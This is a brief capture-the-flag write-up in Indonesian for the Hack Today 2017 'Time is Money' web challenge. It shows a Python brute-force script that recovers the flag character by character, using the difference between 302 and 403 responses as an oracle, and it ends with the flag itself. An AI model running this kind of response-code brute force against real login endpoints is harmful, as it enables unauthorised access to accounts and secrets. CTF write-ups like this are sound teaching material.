# Hack Today 2017: Time is Money

**Category:** Web
**Points:** 65

## Write-up

- Tidak terdapat clue apapun pada misi ini sehingga kami mencoba untuk mengecek respon status kode yang dikirim.
- Karena kami sudah tahu bahwa flag berawalan strings “HackToday{” dan mendapat respon status kode 302, sedangkan apabila mengirimkan strings acak seperti “asd” respon yang didapat adalah 403, yang mengartikan bahwa strings awal yang kami kirim adalah valid.
- Langkah selanjutnya kami coba bruteforce tiap karakter yang ada menggunakan script berikut,

>	import requests</br>
>	charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}"</br>
>	password = "HackToday{"</br>
>	url = "http://sawah.ittoday.web.id:40137/"</br>
>	while(password[-1]!="}"):</br>
>		for i in charset:</br>
>			r = requests.get(url)</br>
>			payload = {'password': password+i, 'submit': 'Submit+Query'}</br>
>			r = requests.post(url, data=payload)</br>
>			if r.status_code==302:</br>
>				password+=i</br>
>				print password</br>

Didapatlah flag : `HackToday{long_l000ng_flag_is_panjaaa44ng_panjaaanggg_b3ndeeeraaa}`.
